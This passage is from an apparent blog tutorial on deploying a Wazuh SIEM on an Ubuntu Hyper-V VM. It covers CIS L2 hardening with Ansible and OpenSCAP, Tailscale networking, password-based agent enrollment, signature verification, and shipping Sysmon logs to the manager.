Set-NetIPInterface -Forwarding Disabled\n</code></pre> <p>If WSL and Hyper-V can't talk after a reboot...</p> <p>You may have to re-enable this after every reboot.</p> <p>Next, modifying the settings before we start:</p> <ul> <li>Right-Click the \"Wazuh\" VM name from the list, choose Settings</li> <li>Security &gt; Secure Boot &gt; Template: <code>Microsoft UEFI Certificate Authority</code></li> <li>Memory &gt; Minimum RAM: <code>4096</code></li> <li>Memory &gt; Maximum RAM: <code>8192</code></li> <li>Processor &gt; Number of virtual processors: 4 (6 if you can)</li> <li>Click \"SCSI Controller\", select \"DVD Drive\", click \"Add\"</li> <li>You'll be on the DVD drive tab automatically, select \"Image file:\" and choose your ubuntu server ISO</li> <li>Integration Services &gt; You can safely disable everything, for isolation</li> <li>Checkpoints &gt; uncheck \"Use automatic checkpoints\"</li> <li>Checkpoints &gt; Checkpoint File Location: <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\Wazuh</code></li> <li>Smart Paging File Location &gt; <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\Wazuh</code></li> <li>Apply, then OK</li> <li>Take a checkpoint (snapshot) here so you don't have to do this again if anything goes wrong</li> </ul> <p></p> <p>Now install Ubuntu as you would normally. You'll need to manually configure <code>eth0</code>.</p> <ul> <li>Subnet: 10.55.55.0/24</li> <li>IPv4: 10.55.55.X</li> <li>Gateway: 10.55.55.1</li> <li>Name Servers: 1.1.1.1,9.9.9.9</li> </ul> <p>Use the entire disk as LVM (default), you do not necessarily need encryption if your host has full disk encryption. Set the server's name to something like <code>wazuh-node</code> or <code>wazuh-standalone</code>. When you get to SSH access, check \"Install OpenSSH server\" and then \"Import SSH Key\" to provide your GItHub username. It will pull your public key (if you have one) from the GitHub API (you can do this with <code>curl</code> by the way) into the <code>~/.ssh/authorized_keys</code> file. Let the install complete.</p> <p>When it's done, follow the prompts as usual to \"eject\" the ISO and reboot. SSH in and ensure the packages are up to date with a <code>sudo apt update; sudo apt upgrade -y; sudo snap refresh</code>. Then <code>sudo systemctl poweroff</code> and take another checkpoint.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#configure-state-cis-l2","title":"Configure State (CIS L2)","text":"<p>CIS L2 Benchmark for Ubuntu Server</p> <p>Here's where you can configure the system into a state, such as the CIS L2 benchmark for Ubuntu server.</p> <p>Apply any additional changes you normally would to secure or configure a server here. These changes need to avoid getting in the way of Wazuh functioning. You may need to test and debug any other hardening policies you apply outside of those mentioned here.</p> <p>The tags and tasks applied in the steps below will still allow Wazuh to function.</p> <p>Install Ansible.</p> <pre><code>sudo apt install -y python3-pip\npython3 -m pip install --user ansible\n# logout, then back in to update your PATH\n</code></pre> <p>Clone my ansible-configs repo.</p> <pre><code>mkdir ~/src\ncd ~/src\ngit clone git@github.com:straysheep-dev/ansible-configs.git\ncd ansible-configs/\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '9906 9EB1 2D40 9EA9 3BD1 E52E B09D 00AE C481 71E0'\ngit verify-commit $( git log | head -n1 | awk '{print $2}')\n\n# You could loop through every commit and verify it, if you can't download over SSH\nfor signature in $(git log | grep -P \"^commit\" | awk '{print $2}'); do if ! (git verify-commit \"$signature\" 2&gt;&amp;1 | grep 'Good signature'); then echo \"[WARNING]: $signature\"; fi ; done\n</code></pre> <p>Uncomment the following roles in <code>playbook.yml</code> to gather some essential packages and tools:</p> <pre><code>    - role: \"install_unbound\"\n#    - role: \"install_ykman\"\n#    - role: \"install_chrome\"\n#    - role: \"build_wireguard_server\"\n    - role: \"build_tailscale_node\"\n#    - role: \"build_ubuntu_desktop\"\n#    - role: \"install_auditd\"\n#    - role: \"hyperv_guest_tools\"\n    - role: \"configure_gnupg\"\n    - role: \"configure_microsoft_repos\"\n#    - role: \"install_vscode\"\n    - role: \"install_powershell\"\n    - role: \"install_sysmon\"\n</code></pre> <p>Unbound DNS</p> <p>My unbound DNS role is usually always added so the machine can leverage DNS over TLS. You can do this with stubby instead, or if you prefer another method altogether that's fine too. <code>systemd-resolved</code> has not had full support for DNS over TLS or HTTPS, and is just starting to support it as of 2023/2024.</p> <p>Generate an authkey. From your Tailnet dashboard go to <code>Settings</code> &gt; <code>Keys</code> &gt; <code>Genereate auth key...</code></p> <p></p> <p>Add the authkey to an ansible-vault.</p> <pre><code>cd ~/src/ansible-configs\nrm auth.yml\nansible-vault create auth.yml\n</code></pre> <p>Contents of <code>auth.yml</code>, with the double quotes around each value:</p> <pre><code>ansible_become_password: \"&lt;your_sudo_password&gt;\"\ntailscale_authkey: \"&lt;tskey-auth-abcdef0123456789abcdef0123456789&gt;\"\n</code></pre> <p>Run the playbook.</p> <pre><code>echo \"Enter Vault Password\"; read -s vault_pass; export ANSIBLE_VAULT_PASSWORD=$vault_pass\n# paste your vault password, hit enter\n\nansible-playbook -i inventory/inventory.ini -e \"@auth.yml\" --vault-pass-file &lt;(cat &lt;&lt;&lt;$ANSIBLE_VAULT_PASSWORD) -v ./playbook.yml\n</code></pre> <p></p> <p>If everything succeeded, poweroff the machine and take a checkpoint. Otherwise read the Ansible output and revise any potential issues. It's possible some tasks may hang, especially if your network drops the connection. Easiest thing here is to <code>ctrl+c</code> and just run the playbook again. It's configuring a state and the roles were written to safely run more than once.</p> <p>\u2699\ufe0f Applying the SCAP Content</p> <p>SSH back in, this time <code>cd ~/src/ansible-configs/inventory_openscap_utils</code>.</p> <p>Ansible OpenSCAP Utils</p> <p>This section is from OpenSCAP Practical Usage.</p> <p>If you haven't already, clone the latest ansible-configs:</p> <pre><code>sudo apt update; sudo apt install -y curl unzip\n\nmkdir ~/src\ncd ~/src\ngit clone https://github.com/straysheep-dev/ansible-configs\ncd ansible-configs/inventory_openscap_utils\n</code></pre> <p>and follow the steps below.</p> <p>Run <code>./download-content.sh</code> to pull the latest OpenSCAP policy release from GitHub.</p> <p></p> <p>It will automatically <code>unzip</code> policy files matching the current OS. To specify another OS, use <code>-u &lt;os-name&gt;</code>.</p> <p></p> <p>You can list all available policy files with <code>-l</code>.</p> <p></p> <p>The wrapper script is written to interpret posix-extended regex. Combine rules from multiple policies like this.</p> <p></p> <p>Comment out any rules in the tags-*.txt files you don't want to apply, or find break the deployment.</p> <p></p> <p>Why Ansible?</p> <p>Running <code>./apply-tags.sh</code> with the <code>-d|--diff</code> options will run Ansible with <code>--check --diff</code>, showing you the changes without making them, and failing if a change cannot be made correctly. This is the strength of this approach. With states maintained as tags you can more easily isolate and debug what could have broken a system, especially if you're testing tags in groups.</p> <p>\ud83d\udcda Script Usage</p> <p>The wrapper script has built in <code>-h|--help</code> information. You can pass it all the arguments you will usually need to either test a policy on the localhost, or use an inventory + vault.</p> <p></p> <p>When the script executes a playbook, the raw command with all of the tags listed will be printed to your screen. This is copy / paste-able to repeat manually if necessary.</p> <p></p> <p>\ud83c\udff7\ufe0f Premade Tags</p> <p>There are also folders in the same directory of premade tag sets that will apply as many rules as possible without breaking a system, exceptions being <code>aide</code> and <code>auditd</code> rules. The reason being these rules often endlessly loop, need tuned to your environment, or break the deployment. Use the <code>aide</code> and <code>install_auditd</code> roles instead.</p> <p>Once all the loops finish, <code>sudo systemctl reboot</code> and SSH back in. Check the system with <code>systemctl status</code> to ensure <code>State:  running</code>. Check <code>journalctl -xe</code> for any errors or issues. If all looks good, poweroff and once again take a checkpoint.</p> <p>Now you're ready to install Wazuh.</p> <p><code>tmux</code></p> <p>When you SSH into the Wazuh server, start a <code>tmux</code> session to easily return to your console if you're disconnected. You can also monitor the install with a second pane using <code>prefix+\"</code> then in the new pane run <code>htop</code>.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#install-wazuh","title":"Install Wazuh","text":"<p>Installation can take 20-30 minutes, or even more depending on your setup and connection speed. Kick off the installer script or playbook and take a break.</p> <p>No matter which method you choose, you can start by ensuring ports tcp/1515, tcp/1514, tcp/55000 allow inbound connections from the Tailnet IP ranges:</p> <pre><code>tailnet_ip=$(ip addr show tailscale0 | grep -oP \"\\b100(\\.(\\d){1,3}){3}\\b\")\nsudo ufw allow in on tailscale0 to $tailnet_ip proto tcp port 1515,1514,55000 comment wazuh\n</code></pre> <p>Wazuh Docs: Large Scale Deployment</p> <p>If you are deploying Wazuh in a large environment, with a high number of servers or endpoints, keep in mind that this deployment might be easier using automation tools such as Puppet, Chef, SCCM, or Ansible.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#agent-authentication","title":"Agent Authentication","text":"<p>Verifying Wazuh Connections</p> <p>This section details steps you can use to lock down connections to and from your Wazuh instance. You may want to do this for a few reasons.</p> <ol> <li>Prevent a rogue Wazuh server from intercepting data from endpoints</li> <li>Prevent rogue endpoints from sending data into your Wazuh instance.</li> </ol> <p>An adversary-controlled Wazuh server having full visibility into an endpoint is less than ideal for a number of reasons, and of these two points is likely the easier to achieve in a real world scenario where there's no authentication.</p> <p>Rogue endpoints enrolling would ideally have little effect on your Wazuh instance, unless a known exploit is available for one of the backend server components, and this exploit can be leveraged by an agent sending crafted data to the data ingestors. You're already using Wazuh to detect and respond to emerging threats, so a malicious endpoint is baked-in to the potential threat model. Practically this would only be used in a more targeted scenario.</p> <p>There are effectively three options. The Wazuh User Manual: Agent Enrollment Security Options page details all of these.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#password-auth","title":"\ud83d\udd11 Password Auth","text":"<p>This method requires using a password during the enrollment process to ensure that Wazuh agents enrolled in the Wazuh manager are authenticated.</p> <ul> <li>Instructions</li> <li>It's recommended to use the same password across all nodes in a multi-node deployment</li> <li>Agents and managers will no longer communicate without the password set on both ends</li> <li>This will break exisitng connections to your manager</li> <li>Configure the manager to expect password auth</li> <li>Configure each agent to use the password during deployment or by adding the <code>authd.pass</code> file later</li> </ul> <p>Generally, if you want to get your Wazuh instance protected with minimal work, this is the way to go. Not only does it prevent unauthorized agents from enrolling, but a rogue server would need to know the password the agent requests when during enrollment. In other words, both the server and agents are protected.</p> <p>This output is from the agent's side when providing an enrollment password on the agent, for a Wazuh server that does not require a password to authenticate.</p> <pre><code>root@bind9-node:~# tail -F /var/ossec/logs/ossec.log\n2025/01/01 11:22:33 wazuh-agentd: INFO: Requesting a key from server: 10.0.0.20\n2025/01/01 11:22:33 wazuh-agentd: INFO: Using agent name as: bind9-node\n2025/01/01 11:22:33 wazuh-agentd: INFO: Waiting for server reply\n2025/01/01 11:22:33 wazuh-agentd: ERROR: Invalid request for new agent (from manager)\n2025/01/01 11:22:33 wazuh-agentd: ERROR: Unable to add agent (from manager)\n</code></pre> <p>These steps enforce password auth on the server:</p> <pre><code>sudo su -\necho \"Enter an enrollment password:\"; read -s wazuh_auth_pass\nsed -E -i 's/&lt;use_password&gt;.*&lt;\\/use_password&gt;/&lt;use_password&gt;yes&lt;\\/use_password&gt;/' /var/ossec/etc/ossec.conf\necho \"$wazuh_auth_pass\" &gt; /var/ossec/etc/authd.pass\nchmod 640 /var/ossec/etc/authd.pass\nchown root:wazuh /var/ossec/etc/authd.pass\nsystemctl restart wazuh-manager\n</code></pre> <p>These steps configure an agent to use password auth:</p> Linux/UnixWindows <pre><code>sudo su -\nWAZUH_MANAGER=\"&lt;server-ip-or-fqdn&gt;\" WAZUH_REGISTRATION_PASSWORD=\"&lt;password&gt;\" apt-get install wazuh-agent\n# Installing the agent with these env variables will make the necessary configurations\n# for password auth to occur.\n\n# If you have existing agents, you will need to deploy the password\n# to each of them:\nsudo su -\necho \"&lt;password&gt;\" &gt; /var/ossec/etc/authd.pass\nchmod 640 /var/ossec/etc/authd.pass\nchown root:wazuh /var/ossec/etc/authd.pass\nsystemctl restart wazuh-agent.service\n</code></pre> <pre><code>.\\wazuh-agent-4.9.2-1.msi /q WAZUH_MANAGER=\"&lt;server-ip-or-fqdn&gt;\" WAZUH_REGISTRATION_PASSWORD=\"&lt;password&gt;\"\nRestart-Service -Name wazuh\n# Installing the agent with these env variables will make the necessary configuraitons\n# for password auth to occur.\n\n# If you have existing agents, you will need to deploy the password\n# to each of them:\n# 32-bit\necho \"&lt;password&gt;\" &gt; \"C:\\Program Files\\ossec-agent\\authd.pass\"\n# 64-bit\necho \"&lt;password&gt;\" &gt; \"C:\\Program Files (x86)\\ossec-agent\\authd.pass\"\n# Restart the agent\nRestart-Service -Name wazuh\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#agent-verification","title":"\ud83c\udfab Agent Verification","text":"<p>This method uses SSL certificates to verify that a Wazuh agent is authorized to enroll in the Wazuh manager.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#manager-verification","title":"\ud83c\udfab Manager Verification","text":"<p>This method uses SSL certificates to verify the identity of the Wazuh manager before a Wazuh agent sends the enrollment request.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#tailnet-enrollment","title":"Tailnet Enrollment","text":"<p>How to enroll multiple endpoints each with their own tailnet_authkey</p> <p>This was covered above in Configure State (CIS L2) with screenshots enrolling just the Wazuh manager machine into a tailnet. Enrolling multiple devices at once is as simple as giving each endpoint a unique variable with a pregenerated authkey.</p> <p>Here's what your vault could contain:</p> <pre><code>client01_tsauthkey: \"tskey-abcdef0123456789abcdef0123456789\"\nserver01_tsauthkey: \"tskey-abcdef0123456789abcdef0123456789\"\n&lt;SNIP&gt;\n</code></pre> <p>...and the corresponding inventory file:</p> <pre><code>managed_group:\n  hosts:\n    172.16.20.20:\n      ansible_port: 22\n      ansible_user: user\n      tailscale_authkey: \"{{ client01_tsauthkey }}\"\n    172.16.20.21:\n      ansible_port: 22\n      ansible_user: server\n      tailscale_authkey: \"{{ server01_tsauthkey }}\"\n      is_exit_node: \"true\"\n      &lt;SNIP&gt;\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#shell-scripting","title":"Shell Scripting","text":""},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#deploy-a-single-node","title":"\ud83d\udce6 Deploy a Single Node","text":"<p>There's a shell script that will deploy the SIEM on a single node.</p> <pre><code>cd ~/src\ncurl -sO https://packages.wazuh.com/4.8/wazuh-install.sh &amp;&amp; sudo bash ./wazuh-install.sh -a\n</code></pre> <p></p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#deploy-agents","title":"\ud83d\udce6 Deploy Agents","text":"<p>Deploy agents with a few lines.</p> <p>Wazuh's Public Key</p> <pre><code>$ gpg --with-fingerprint /usr/share/keyrings/wazuh.gpg\n    gpg: WARNING: no command supplied.  Trying to guess what you mean ...\n    pub   rsa4096/0x96B3EE5F29111145 2016-08-01 [SC] [expires: 2027-05-15]\n        Key fingerprint = 0DCF CA55 47B1 9D2A 6099  5060 96B3 EE5F 2911 1145\n    uid                             Wazuh.com (Wazuh Signing Key) &lt;support@wazuh.com&gt;\n    sub   rsa4096/0x417F3D5A664FAB32 2016-08-01 [E] [expires: 2027-05-15]\n        Key fingerprint = 7C74 8627 7A6A 9681 DF3F  3D8A 417F 3D5A 664F AB32\n</code></pre> LinuxWindows <pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import &amp;&amp; sudo chmod 644 /usr/share/keyrings/wazuh.gpg\necho \"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main\" | sudo tee -a /etc/apt/sources.list.d/wazuh.list\nsudo apt-get update\n# Change to root\nsudo su -\nWAZUH_MANAGER=\"&lt;server-ip-or-fqdn&gt;\" WAZUH_REGISTRATION_PASSWORD=\"&lt;password&gt;\" apt-get install wazuh-agent\n</code></pre> <pre><code>cd $env:TEMP\niwr -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.8.0-1.msi -OutFile wazuh-agent.msi\nStart-Process msiexec '/quiet /i wazuh-agent.msi WAZUH_MANAGER=\"&lt;server-ip-or-fqdn&gt;\" WAZUH_REGISTRATION_PASSWORD=\"&lt;password&gt;\"'\n</code></pre> <p>Deploy agents as root / admin</p> <p><code>sudo su -</code> or run from an administrator powershell session when using the <code>WAZUH_MANAGER=\"&lt;ip&gt;\" apt-get install wazuh-agent</code> otherwise the environment variable isn't read correctly.</p> <p>If this happens, manually add your manager's tailnet IP in <code>/var/ossec/etc/ossec.conf</code> or <code>C:\\Program Files (x86)\\ossec-agent\\ossec.conf</code> on the endpoint:</p> <p></p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#ansible","title":"Ansible","text":"<p>The Ansible repo allows for a distributed cluster or a single node / agent deployment. This guide recommends using Ansible to help you automate your infrastructure and endpoint enrollment. Create your own roles or plays for custom configurations.</p> <ul> <li>\ud83c\udf10 wazuh-ansible</li> <li>\ud83c\udf10 You'll want to use the latest release's tag</li> </ul> <p>Obtain the latest release version:</p> <pre><code>RESPONSE=$(curl -s https://api.github.com/repos/wazuh/wazuh-ansible/releases/latest)\nURL=$(echo \"$RESPONSE\" | awk -F '\"' '/zipball_url/{print $4}')\nTAG=$(echo \"$RESPONSE\" | awk -F '\"' '/tag_name/{print $4}')\n\ncurl --silent -L \"$URL\" --output wazuh-ansible-\"$TAG\".zip\n</code></pre> <p>Alernatively you could clone the entire repo and checkout the latest tag:</p> <pre><code>git clone https://github.com/wazuh/wazuh-ansible\ncd wazuh-ansible\ngit tag\ngit checkout tags/v4.8.0\n</code></pre> <p>If you want to verify the latest tag signature, look for the <code>Good signature from \"GitHub &lt;noreply@github.com&gt;\" [unknown]</code> line.</p> <pre><code># Obtain GitHub's signing key\n# https://github.com/web-flow.gpg\n# 5DE3E0509C47EA3CF04A42D34AEE18F83AFDEB23\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '5DE3E0509C47EA3CF04A42D34AEE18F83AFDEB23'\ngit verify-commit v4.8.0\ngpg: Signature made Thu Jun  6 07:09:59 2024 UTC\ngpg:                using RSA key B5690EEEBB952194\ngpg: Good signature from \"GitHub &lt;noreply@github.com&gt;\" [unknown]\ngpg: WARNING: This key is not certified with a trusted signature!\ngpg:          There is no indication that the signature belongs to the owner.\nPrimary key fingerprint: 9684 79A1 AFF9 27E3 7D1A  566B B569 0EEE BB95 2194\n</code></pre> <p>Verifying Git Signatures: Tags vs Releases vs Commits</p> <p>If commit signing is enforced for a project, and it's on GitHub, commits will either be signed by the committer's key, or GitHub's signing key.</p> <p>Tags are sometimes a more \"complete\" snapshot of a repo's contents, where commits only validate the changes they relate to. It's better to check the tag or even a release signature when possible, else you'll need to loop through every commit if they've all been signed. A release signature is often it's own .asc file released along side the other release files, so you can check the integrity of each file with the .asc signature using the related public key.</p> <p>In the case of wazuh-ansible the tags are actually commits. Basically you have a few options:</p> <ul> <li>Clone the repo over SSH (trusting GitHub's keys)</li> <li>Ensure your DNS is trustworthy (use 1.1.1.1 or 9.9.9.9 or 8.8.8.8 over TLS / HTTPS)</li> <li>Loop through the commit signatures</li> </ul> <p>In all cases you'll need to place trust primarily into the project (which your're already doing by using it) and GitHub's infrastructure. This is an overly paranoid take on verifying integrity, but something to consider when an EDR / SIEM has complete access to your infrastructure. If you'd rather use Wazuh's apt / dnf installation options, they rely on the Wazuh signing key which has a known fingerprint of <code>0DCF CA55 47B1 9D2A 6099  5060 96B3 EE5F 2911 1145</code>. Use this fingerprint to cross reference it against the GPG key from Wazuh.com and keyserver.ubuntu.com</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#deploy-a-single-node_1","title":"\ud83d\udce6 Deploy a Single Node","text":"<p><code>cd</code> into the project folder and create a new inventory file.</p> <pre><code>nano inventory.yaml\n</code></pre> <p>In this example, we're creating the \"aio\" or all-in-one inventory group, which points to remote machine(s) that already have our SSH public key on them for us to connect to, and we have the ansible user's <code>sudo</code> password for privilege escalation.</p> <pre><code>aio:\n  hosts:\n    192.168.123.198:\n      ansible_user: user1\n      ansible_become_password: 'packer'  # Replace this with a vault variable\n      ansible_become_method: sudo\n</code></pre> <p>You won't need to modify anything in the playbook (even the 127.0.0.1 addresses) other than using sudo instead of root:</p> <pre><code># Comment out all instances of \"root\" and replace with\nbecome: yes\n</code></pre> <p>If you are in fact doing this \"locally\" it will still try to ssh into 127.0.0.1. You'll need a public key your own localhost will accept ssh connections over.</p> <pre><code>sudo su -\nssh-keygen  # Enter all defaults, no password\neval $(ssh-agent -s)\nssh-add ~/.ssh/id_rsa\nssh-add -L &gt;&gt; ~/.ssh/authorized_keys\n</code></pre> <p>Temporary SSH key for deployment</p> <p>You should delete this public / private key pair once you're done installing Wazuh. It's only available on the server, so it's not a huge risk, but should not be left behind.</p> <p>Execute with</p> <pre><code>ansible-playbook -i inventory.yaml -v ./wazuh-single.yml\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#deploy-agents_1","title":"\ud83d\udce6 Deploy Agents","text":"<p>Tailnet connections</p> <p>Your endpoints should already be enrolled, or get unrolled, before the wazuh-agent is installed so it can reach the wazuh-manager.</p> <p><code>cd</code> into the project folder and edit the <code>wazuh-agent.yml</code> playbook.</p> <pre><code>cd playbooks\nnano wazuh-agent.yml\n</code></pre> <p>Replace <code>hosts:</code> with either the keyword <code>localhost</code> to run locally or create a group name to reference in an inventory file. Replace <code>address:</code> with your Wazuh manager's Tailnet IP.</p> <pre><code>---\n- hosts: tailnet_group\n  become: yes\n  become_user: root\n  roles:\n    - ../roles/wazuh/ansible-wazuh-agent\n  vars:\n    wazuh_managers:\n      - address: &lt;your Wazuh manager's Tailnet IP&gt;\n        port: 1514\n        protocol: tcp\n        api_port: 55000\n        api_proto: 'https'\n        api_user: wazuh\n        max_retries: 5\n        retry_interval: 5\n</code></pre> <p>We'll use an inventory file, assuming you may want to deploy the agent on a number of endpoints.</p> <ul> <li><code>tailnet_group</code> is the group name we came up with for these hosts</li> <li>All you need is the tailnet IP of the endpoint</li> <li>We'll be authenticating and running as root to avoid having to create a vault with sudo passwords for each endpoint</li> <li><code>/root/.ssh/authorized_keys</code> must have a public key to access your connection</li> </ul> <pre><code>tailnet_group:\n  hosts:\n    172.16.20.20:\n      ansible_port: 22\n      ansible_user: user\n    172.16.20.21:\n      ansible_port: 22\n      ansible_user: server\n&lt;SNIP&gt;\n</code></pre> <p>Windows Endpoints</p> <p>You effectively have two options for opening Windows endpoints to Ansible provisioning:</p> <ul> <li>WinRM (Domain-Joined, ideally with Kerberos auth)</li> <li>\ud83c\udf10 SSH (Best for non-domain-joined endpoints)</li> </ul> <p>First, change the playbook to support the become method <code>runas</code>, and specify an admin user.</p> <pre><code>- hosts: tailnet_group\n  become: yes\n  become_user: admin\n  become_method: runas\n  &lt;SNIP&gt;\n</code></pre> <p>Next, update your <code>inventory.yml</code> file by appending the following options to your Windows endpoints:</p> <ul> <li><code>cmd</code> is the default shell for SSH on Windows</li> <li>Change this to <code>powershell</code> if you've defined PowerShell as the default login shell</li> <li>Ensure <code>C:\\Temp</code> exists, or specify a different temp directory</li> </ul> <pre><code>&lt;SNIP&gt;\n  vars:\n    ansible_port: 22\n    ansible_user: admin\n    ansible_connection: ssh\n    ansible_shell_type: cmd\n    become_method: runas\n    shell_type: cmd\n    remote_tmp: \"C:\\Temp\\ansible\"\n&lt;SNIP&gt;\n</code></pre> <p>See the following references:</p> <ul> <li>\ud83c\udf10 Ansible Playbook Fails on Windows</li> <li>\ud83c\udf10 Ansible Playbook Become Error</li> </ul> <p>Execute with:</p> <pre><code>~/.local/bin/ansible-playbook -i inventory.ini -b -v ./wazuh-agent.yml\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#docker","title":"Docker","text":"<p>\u26a0\ufe0f TO DO: This section is still under construction, check back later! \u26a0\ufe0f</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#disk-usage","title":"Disk Usage","text":"<p>\u26a0\ufe0f TO DO: This section is still under construction, check back later! \u26a0\ufe0f</p> <p>Paths that will contain a large amount of data:</p> <ul> <li><code>/var/ossec/queue/vd/feed</code> Vulnerability data, set a retention policy in <code>vulnerability-detection</code> of <code>ossec.conf</code> on the manager</li> <li><code>/var/ossec/logs</code> Logs from your endpoints</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#central-management","title":"Central Management","text":"<p>\u26a0\ufe0f TO DO: This section is still under construction, check back later! \u26a0\ufe0f</p> <p>Wazuh User Manual: Central Configuration</p> <ul> <li>Config per OS?</li> <li>Multiple config templates?</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#ingesting-logs","title":"Ingesting Logs","text":"<p>For reference, the post from Wazuh's blog below is a great starting point for auditd, sysmon, sysmonforlinux, and a repo to use for custom decoders and rules.</p> <ul> <li>\ud83c\udf10 Detecting the SysJoker malware with Wazuh</li> <li>\ud83c\udf10 github/socfortress/Wazuh-Rules</li> </ul> <p>The 3 Components</p> <p>What can be confusing at first, is \"what exactly do I need to start ingesting and seeing log data into my Wazuh instance?\".</p> <p>This requires 3 essential pieces:</p> <ul> <li>Logging configuration: This includs config.xml (sysmon) or audit.rules (auditd)</li> <li>Wazuh decoder file: Wazuh uses this file to interpret the log data, (e.g. sysmon and auditd data are very different) basically, you need a custom decoder</li> <li>Wazuh rule file: This tells Wazuh what to do with the data, how to classify it's severity and whether to show it at all</li> </ul> <p>If this seems overwhelming don't worry, this blog exists to overcome this jump by detailing exactly what you can \"leave as a default\" and what you can maintain.</p> <p>The goal is to get the data generated by your existing logging configurations to appear in Wazuh and be actionable while still maintainable.</p> <p>At first glance in the Wazuh docs, configuring auditd rules to fire is daunting, and basically requires you to now maintain new keys in your config, or potentially even rewrite it to work with Wazuh rules in this way. Fortunately, and largely thanks to the SOCFortress files, it's not like that anymore using these \"general\" decoder and rule files, and Wazuh does a lot of heavy lifting using these components out of the box now.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#sysmon","title":"Sysmon","text":"<p>Get started with one of the following configuration options:</p> <ul> <li>\ud83c\udf10 github.com/SwiftOnSecurity/sysmon-config</li> <li>\ud83c\udf10 github.com/Neo23x0/sysmon-config, a more up to date fork</li> <li>\ud83c\udf10 github.com/olafhartong/sysmon-modular, more advanced and requires tuning</li> </ul> <p>NOTE: Neo23x0's version is recommended.</p> <p>On the endpoint:</p> <pre><code>$url_list = @(\n    \"https://github.com/Neo23x0/sysmon-config/raw/master/sysmonconfig-export.xml\",\n    \"https://live.sysinternals.com/Sysmon64.exe\"\n    )\n\n# Only check the config file, Sysmon is signed by Microsoft, can be reviewed with sigcheck64.exe\n$sha256_list = @(\n    \"6625BDD777DDC230730EBA628607F4B99123A011ED5B4AE91C20A264AC2DA3B9\"\n    )\n\ncd $env:TEMP\n$progressPreference = 'silentlyContinue'\n\nforeach ($url in $url_list) {\n    $basename = Split-Path -Path $url -Leaf\n    iwr -Uri \"$url\" -OutFile $basename\n}\n\nif (!(get-filehash sysmonconfig-export.xml | sls $sha256_list))\n{\n    Write-Host -ForegroundColor RED \"[WARNING]SHA256 mismatch $basename\"\n} else\n{\n    Write-Host -ForegroundColor Green \"[OK]SHA256SUM $basename\"\n}\n\n# Install Sysmon with config file\n.\\Sysmon64.exe -accepteula -i sysmonconfig-export.xml\n\n# Configure wazuh-agent to ship Sysmon events to the manager\n$configuration_text = \"\n&lt;ossec_config&gt;\n  &lt;localfile&gt;\n    &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;\n    &lt;log_format&gt;eventchannel&lt;/log_format&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;\n\"\n\necho $configuration_text | Out-File -FilePath \"C:\\Program Files (x86)\\ossec-agent\\ossec.conf\" -Encoding ASCII -Append\nRestart-Service WazuhSvc\n</code></pre> <p>Manage-Sysinternals.ps1</p> <p>There's also my PowerShell script that will automatically download a pinned version of SwiftOnSecurity's sysmon-config.xml, Sysmon itself (as well as any other Sysinternals tools you select) and install it all for you under <code>C:\\Tools</code>.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#sysmonforlinux","title":"SysmonForLinux","text":"<p>The blog post uses config files from the https://github.com/socfortress/Wazuh-Rules repo, so you should fork it and use them in your own infrastructure.</p> <p>These steps use hard-coded hashes. If the hash changes, go to the source (ideally your fork) and check what changed.</p> <p>Get the Sysmon config, Wazuh rules, and Wazuh decoder file.</p> <p>On the endpoint:</p> <pre><code>cd /tmp\ncurl -LfO 'https://wazuh.com/resources/blog/detecting-sysjoker-backdoor-malware-with-wazuh/sysmonforlinux-config.xml'\nsha256sum ./sysmonforlinux-config.xml | grep -P \"\\bca8a78c13ade0acc6778c9ed100e4ca5e073403ba6ad208d44f69b5bdbcfe222\\b\" || echo \"[WARNING]checksum error.\"\nsudo sysmon -c ./sysmonforlinux-config.xml\n</code></pre> <p>One the server: <pre><code>cd ~/src\nurl_list='\nhttps://wazuh.com/resources/blog/detecting-sysjoker-backdoor-malware-with-wazuh/sysmonforlinux-config.xml\nhttps://raw.githubusercontent.com/socfortress/Wazuh-Rules/main/Sysmon%20Linux/decoder-linux-sysmon.xml\nhttps://raw.githubusercontent.com/socfortress/Wazuh-Rules/main/Sysmon%20Linux/200150-sysmon_for_linux_rules.xml\n'\nfor url in $url_list\ndo\n    curl -LfO 